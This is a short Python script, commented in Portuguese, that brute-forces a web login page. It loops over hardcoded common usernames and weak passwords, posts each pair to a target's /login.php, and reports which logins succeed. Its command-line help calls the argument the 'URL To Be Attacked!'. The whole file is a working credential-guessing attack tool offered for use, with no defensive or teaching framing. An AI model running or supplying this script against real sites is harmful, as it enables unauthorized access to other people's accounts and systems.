import requests
from colorama import Fore, init
import argparse

# Initialize Colorama
init(autoreset=True)

def brute_force_login(url):
    # Lista de nomes de usuário e senhas para tentativas de login
    usernames = ["admin", "root", "administrator", "user", "test"]
    passwords = ["password", "admin123", "123456", "secret", "letmein"]

    for username in usernames:
        for password in passwords:
            try:
                full_url = url
                # Substitua "login.php" pela URL real da página de login
                login_url = full_url + "/login.php"
                session = requests.Session()
                login_data = {"username": username, "password": password}
                response = session.post(login_url, data=login_data)

                # Verifique se o login foi bem-sucedido com base na resposta da página
                if "Logged in" in response.text:
                    print(f"Login Successful - Username: {username}, Password: {password}")
                else:
                    print(f"Login Failed - Username: {username}, Password: {password}")

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Error: {str(e)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, help='URL To Be Attacked!')
    args = parser.parse_args()

    if args.url:
        brute_force_login(args.url)
    else:
        print(Fore.RED + "Please provide a target URL using the -u or --url option.")
